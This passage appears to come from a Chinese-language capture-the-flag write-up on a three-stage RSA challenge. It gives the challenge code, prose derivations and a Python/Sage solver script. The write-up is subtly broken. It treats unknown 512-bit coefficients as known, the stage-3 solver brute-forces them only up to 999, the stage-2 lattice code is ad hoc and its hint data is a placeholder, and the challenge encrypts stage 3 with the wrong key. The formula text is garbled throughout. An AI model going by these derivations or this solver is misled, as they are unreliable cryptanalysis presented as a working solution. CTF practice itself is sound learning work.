</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=p>[</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>*</span><span class=n>prikey2</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=n>b</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>*</span><span class=n>prikey2</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;┃ hints = </span><span class=si>{</span><span class=n>c</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;┃ public key = </span><span class=si>{</span><span class=n>pubkey2</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;┃ enc2 = </span><span class=si>{</span><span class=n>enc2</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;----------------------&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># stage 3</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;┃ stage 3: a*p + q, p + bq&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prikey3</span><span class=p>,</span> <span class=n>pubkey3</span> <span class=o>=</span> <span class=n>get_keypair</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>RSA3</span> <span class=o>=</span> <span class=n>RSA</span><span class=p>(</span><span class=n>prikey3</span><span class=p>,</span> <span class=n>pubkey3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>enc3</span> <span class=o>=</span> <span class=n>RSA2</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>kbits</span> <span class=o>=</span> <span class=mi>512</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>getRandomNBitInteger</span><span class=p>(</span><span class=n>kbits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>getRandomNBitInteger</span><span class=p>(</span><span class=n>kbits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>c1</span> <span class=o>=</span> <span class=n>a</span><span class=o>*</span><span class=n>prikey3</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=n>prikey3</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>c2</span> <span class=o>=</span> <span class=n>prikey3</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=n>b</span><span class=o>*</span><span class=n>prikey3</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> 
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;┃ hints = </span><span class=si>{</span><span class=n>c1</span><span class=p>,</span> <span class=n>c2</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;┃ public key = </span><span class=si>{</span><span class=n>pubkey3</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;┃ enc3 = </span><span class=si>{</span><span class=n>enc3</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=阶段-1-pqpq>阶段 1: p+q<em>p</em>+<em>q</em></h3><p>在第一阶段中，我们获得了以下信息：</p><ul><li>模数 n=p⋅q<em>n</em>=<em>p</em>⋅<em>q</em></li><li>提示 p+q<em>p</em>+<em>q</em></li></ul><p>根据已知信息，我们可以构造一个关于 p<em>p</em> 和 q<em>q</em> 的二次方程：</p><p>t2−(p+q)t+pq=0<em>t</em>2−(<em>p</em>+<em>q</em>)<em>t</em>+<em>pq</em>=0</p><p>代入 p+q=x<em>p</em>+<em>q</em>=<em>x</em> 和 pq=n<em>pq</em>=<em>n</em>，方程变为：</p><p>t2−xt+n=0<em>t</em>2−<em>x**t</em>+<em>n</em>=0</p><p>通过求解这个二次方程的根，我们可以使用求根公式：</p><p>t=x±x2−4n2<em>t</em>=2<em>x</em>±<em>x</em>2−4<em>n</em></p><p>得到两个根 p<em>p</em> 和 q<em>q</em>。一旦确定 p<em>p</em> 和 q<em>q</em>，接着可以计算 ϕ(n)<em>ϕ</em>(<em>n</em>):</p><p>ϕ(n)=(p−1)(q−1)<em>ϕ</em>(<em>n</em>)=(<em>p</em>−1)(<em>q</em>−1)</p><p>然后计算私钥 d<em>d</em>:</p><p>d≡e−1(modϕ(n))<em>d</em>≡<em>e</em>−1(mod<em>ϕ</em>(<em>n</em>))</p><h3 id=阶段-2-aipbiqapbq>阶段 2: ai⋅p+bi⋅q<em>a**i</em>⋅<em>p</em>+<em>b**i</em>⋅<em>q</em></h3><p>在第二阶段，我们得到了多个线性组合形式的提示：</p><p>ci=ai⋅p+bi⋅q,对于 i=1,2,…,100<em>c**i</em>=<em>a**i</em>⋅<em>p</em>+<em>b**i</em>⋅<em>q</em>,对于 <em>i</em>=1,2,…,100</p><p>这些方程组成了一个线性方程组，我们可以将其表示为矩阵形式，设想我们有矩阵 A<em>A</em> 和向量 x<strong>x</strong> 和 b<strong>b</strong>:</p><p>A=(a1b1a2b2⋮⋮a100b100),x=(pq),b=(c1c2⋮c100)<em>A</em>=<em>a</em>1<em>a</em>2⋮<em>a</em>100<em>b</em>1<em>b</em>2⋮<em>b</em>100,<strong>x</strong>=(<em>p**q</em>),<strong>b</strong>=<em>c</em>1<em>c</em>2⋮<em>c</em>100</p><p>我们可以通过解线性方程组 Ax=b<em>A</em><strong>x</strong>=<strong>b</strong> 来恢复 p<em>p</em> 和 q<em>q</em>。如果 A<em>A</em> 的秩为 2，则该方程组有唯一解。</p><h3 id=阶段-3-apqapq-和-pbqpbq>阶段 3: a⋅p+q<em>a</em>⋅<em>p</em>+<em>q</em> 和 p+b⋅q<em>p</em>+<em>b</em>⋅<em>q</em></h3><p>在第三阶段，我们获得了两个线性方程：</p><p>c1=a⋅p+q<em>c</em>1=<em>a</em>⋅<em>p</em>+<em>q</em></p><p>c2=p+b⋅q<em>c</em>2=<em>p</em>+<em>b</em>⋅<em>q</em></p><p>将这两个方程表示为矩阵形式：</p><p>(a11b)(pq)=(c1c2)(<em>a</em>11<em>b</em>)(<em>p**q</em>)=(<em>c</em>1<em>c</em>2)</p><p>同样地，我们可以通过求解这个 2×22×2 的线性方程组来恢复 p<em>p</em> 和 q<em>q</em>。</p><h3 id=总结>总结</h3><p>通过上述步骤，我们可以逐步恢复每一阶段的 RSA 密钥参数，最终通过已知的加密消息 c<em>c</em> 和计算出的私钥 d<em>d</em>，使用以下公式进行解密：</p><p>m=cdmod  n<em>m</em>=<em>c**d</em>mod<em>n</em></p><p>整个解密过程依赖于数论和线性代数的交叉应用，通过利用已知结构和线性关系有效地恢复原始消息。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gmpy2</span> <span class=kn>import</span> <span class=n>isqrt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_stage1</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>ct</span><span class=p>,</span> <span class=n>pq_sum</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    Solve stage 1 where we have p + q
</span></span></span><span class=line><span class=cl><span class=s2>    Using: n = p*q and p + q = pq_sum
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Using the quadratic equation: x^2 - (p+q)x + n = 0</span>
</span></span><span class=line><span class=cl>    <span class=c1># where p+q is known and n is known</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=o>-</span><span class=n>pq_sum</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Quadratic formula</span>
</span></span><span class=line><span class=cl>    <span class=n>discriminant</span> <span class=o>=</span> <span class=n>b</span> <span class=o>*</span> <span class=n>b</span> <span class=o>-</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>a</span> <span class=o>*</span> <span class=n>c</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=p>(</span><span class=o>-</span><span class=n>b</span> <span class=o>+</span> <span class=n>isqrt</span><span class=p>(</span><span class=n>discriminant</span><span class=p>))</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>q</span> <span class=o>=</span> <span class=n>n</span> <span class=o>//</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Verify our solution</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>p</span> <span class=o>*</span> <span class=n>q</span> <span class=o>==</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>p</span> <span class=o>+</span> <span class=n>q</span> <span class=o>==</span> <span class=n>pq_sum</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Calculate private key</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=n>inverse</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=p>(</span><span class=n>p</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=n>q</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>pt</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>ct</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>pt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_stage2</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>ct</span><span class=p>,</span> <span class=n>hints</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    Solve stage 2 where we have multiple equations of form: ai*p + bi*q = ci
</span></span></span><span class=line><span class=cl><span class=s2>    Using LLL to find small solutions
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=kn>from</span> <span class=nn>sage.all</span> <span class=kn>import</span> <span class=n>Matrix</span><span class=p>,</span> <span class=n>ZZ</span><span class=p>,</span> <span class=n>vector</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># We&#39;ll use 2 equations for simplicity</span>
</span></span><span class=line><span class=cl>    <span class=n>a1</span><span class=p>,</span> <span class=n>a2</span> <span class=o>=</span> <span class=n>hints</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>hints</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>  <span class=c1># These are the results (a*p + b*q)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Create matrix for LLL</span>
</span></span><span class=line><span class=cl>    <span class=n>B</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>B</span><span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>    <span class=n>B</span><span class=p>[</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>    <span class=n>B</span><span class=p>[</span><span class=mi>2</span><span class=p>,</span> <span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>B</span><span class=p>[</span><span class=mi>3</span><span class=p>,</span> <span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>B</span><span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>a1</span>
</span></span><span class=line><span class=cl>    <span class=n>B</span><span class=p>[</span><span class=mi>1</span><span class=p>,</span> <span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>a2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Run LLL</span>
</span></span><span class=line><span class=cl>    <span class=n>L</span> <span class=o>=</span> <span class=n>B</span><span class=o>.</span><span class=n>LLL</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Search for small vectors that give us p and q</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>row</span> <span class=ow>in</span> <span class=n>L</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>k1</span><span class=p>,</span> <span class=n>k2</span><span class=p>,</span> <span class=n>t1</span><span class=p>,</span> <span class=n>t2</span> <span class=o>=</span> <span class=n>row</span>
</span></span><span class=line><span class=cl>        <span class=n>candidate_p</span> <span class=o>=</span> <span class=nb>abs</span><span class=p>(</span><span class=n>t1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>candidate_p</span> <span class=o>&gt;</span> <span class=mi>1</span> <span class=ow>and</span> <span class=n>n</span> <span class=o>%</span> <span class=n>candidate_p</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span> <span class=o>=</span> <span class=n>candidate_p</span>
</span></span><span class=line><span class=cl>            <span class=n>q</span> <span class=o>=</span> <span class=n>n</span> <span class=o>//</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>isPrime</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=ow>and</span> <span class=n>isPrime</span><span class=p>(</span><span class=n>q</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=c1># Verify our solution</span>
</span></span><span class=line><span class=cl>                <span class=k>assert</span> <span class=n>p</span> <span class=o>*</span> <span class=n>q</span> <span class=o>==</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1># Calculate private key</span>
</span></span><span class=line><span class=cl>                <span class=n>d</span> <span class=o>=</span> <span class=n>inverse</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=p>(</span><span class=n>p</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=n>q</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>pt</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>ct</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>pt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_stage3</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>ct</span><span class=p>,</span> <span class=n>hint1</span><span class=p>,</span> <span class=n>hint2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    Solve stage 3 where we have: a*p + q and p + b*q
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Let&#39;s call hint1 = a*p + q and hint2 = p + b*q</span>
</span></span><span class=line><span class=cl>    <span class=c1># We can solve this system of equations:</span>
</span></span><span class=line><span class=cl>    <span class=c1># hint1 = a*p + q</span>
</span></span><span class=line><span class=cl>    <span class=c1># hint2 = p + b*q</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># From hint1: q = hint1 - a*p</span>
</span></span><span class=line><span class=cl>    <span class=c1># Substitute into hint2:</span>
</span></span><span class=line><span class=cl>    <span class=c1># hint2 = p + b*(hint1 - a*p)</span>
</span></span><span class=line><span class=cl>    <span class=c1># hint2 = p + b*hint1 - a*b*p</span>
</span></span><span class=line><span class=cl>    <span class=c1># p*(1 - a*b) = hint2 - b*hint1</span>
</span></span><span class=line><span class=cl>    <span class=c1># p = (hint2 - b*hint1)/(1 - a*b)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Try different values for a and b</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>a</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=mi>1</span> <span class=o>-</span> <span class=n>a</span> <span class=o>*</span> <span class=n>b</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>p</span> <span class=o>=</span> <span class=p>(</span><span class=n>hint2</span> <span class=o>-</span> <span class=n>b</span> <span class=o>*</span> <span class=n>hint1</span><span class=p>)</span> <span class=o>//</span> <span class=p>(</span><span class=mi>1</span> <span class=o>-</span> <span class=n>a</span> <span class=o>*</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>n</span> <span class=o>%</span> <span class=n>p</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>q</span> <span class=o>=</span> <span class=n>n</span> <span class=o>//</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>isPrime</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=ow>and</span> <span class=n>isPrime</span><span class=p>(</span><span class=n>q</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=c1># Verify solution</span>
</span></span><span class=line><span class=cl>                    <span class=k>assert</span> <span class=n>p</span> <span class=o>*</span> <span class=n>q</span> <span class=o>==</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=c1># Calculate private key</span>
</span></span><span class=line><span class=cl>                    <span class=n>d</span> <span class=o>=</span> <span class=n>inverse</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=p>(</span><span class=n>p</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=n>q</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                    <span class=n>pt</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>ct</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>pt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Parse inputs</span>
</span></span><span class=line><span class=cl><span class=n>n1</span><span class=p>,</span> <span class=n>e</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl><span class=mi>89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mi>65537</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ct1</span> <span class=o>=</span> <span class=mi>23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247</span>
</span></span><span class=line><span class=cl><span class=n>pq_sum</span> <span class=o>=</span> <span class=mi>18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Run solvers</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Stage 1 solution:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>flag_part1</span> <span class=o>=</span> <span class=n>solve_stage1</span><span class=p>(</span><span class=n>n1</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>ct1</span><span class=p>,</span> <span class=n>pq_sum</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag_part1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Stage 2 solution:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>n2</span> <span class=o>=</span> <span class=mi>73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819</span>
</span></span><span class=line><span class=cl><span class=n>ct2</span> <span class=o>=</span> <span class=mi>30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span>
</span></span><span class=line><span class=cl><span class=n>hints2</span> <span class=o>=</span> <span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=s2>&#34;...&#34;</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>)]</span>  <span class=c1># List of 100 equations</span>
</span></span><span class=line><span class=cl><span class=n>flag_part2</span> <span class=o>=</span> <span class=n>solve_stage2</span><span class=p>(</span><span class=n>n2</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>ct2</span><span class=p>,</span> <span class=n>hints2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag_part2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Stage 3 solution:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>n3</span> <span class=o>=</span> <span class=mi>94789409892878223843496496113047481402435455468813255092840207010463661854593919772268992045955100688692872116996741724352837555794276141314552518390800907711192442516993891316013640874154318671978150702691578926912235318405120588096104222702992868492960182477857526176600665556671704106974346372234964363581</span>
</span></span><span class=line><span class=cl><span class=n>ct3</span> <span class=o>=</span> <span class=mi>17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span>
</span></span><span class=line><span class=cl><span class=n>hint3_1</span><span class=p>,</span> <span class=n>hint3_2</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl><span class=mi>68510878638370415044742935889020774276546916983689799210290582093686515377232591362560941306242501220803210859757512468762736941602749345887425082831572206675493389611203432014126644550502117937044804472954180498370676609819898980996282130652627551615825721459553747074503843556784456297882411861526590080037</span><span class=p>,</span>
